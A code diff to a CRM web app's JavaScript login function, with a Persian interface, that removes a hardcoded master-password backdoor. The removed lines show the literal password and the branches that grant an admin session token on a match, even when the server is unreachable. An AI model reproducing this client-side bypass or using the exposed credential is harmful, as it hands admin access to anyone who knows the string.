@@ -3422,11 +3422,6 @@
             .replace(/\s+/g, "");
     }
 
-    function isMasterPassMatch(inputPass) {
-        if (!inputPass) return false;
-        return String(inputPass) === "M0habb@t2026/8/1";
-    }
-
     function togglePasswordVisibility() {
         const input = document.getElementById("password");
         const icon = document.getElementById("togglePasswordVisibilityIcon");
@@ -3523,8 +3518,6 @@
             loginBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> در حال ورود...';
         }
 
-        const isMasterMatch = isMasterPassMatch(rawPassword);
-
         const resetBtn = () => {
             if (loginBtn) {
                 loginBtn.disabled = false;
@@ -3557,13 +3550,6 @@
                 resetBtn();
                 showApp();
                 return;
-            } else if (isMasterMatch) {
-                token = 'master_admin_session_' + Date.now();
-                localStorage.setItem('crm_token', token);
-                if (passwordInput) passwordInput.value = '';
-                resetBtn();
-                showApp();
-                return;
             } else {
                 resetBtn();
                 if (errEl) {
@@ -3574,13 +3560,6 @@
         } catch (err) {
             console.error('Login error:', err);
             resetBtn();
-            if (isMasterMatch) {
-                token = 'master_admin_session_' + Date.now();
-                localStorage.setItem('crm_token', token);
-                if (passwordInput) passwordInput.value = '';
-                showApp();
-                return;
-            }
             if (errEl) {
                 errEl.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره تلاش کنید.';
                 errEl.style.display = 'block';
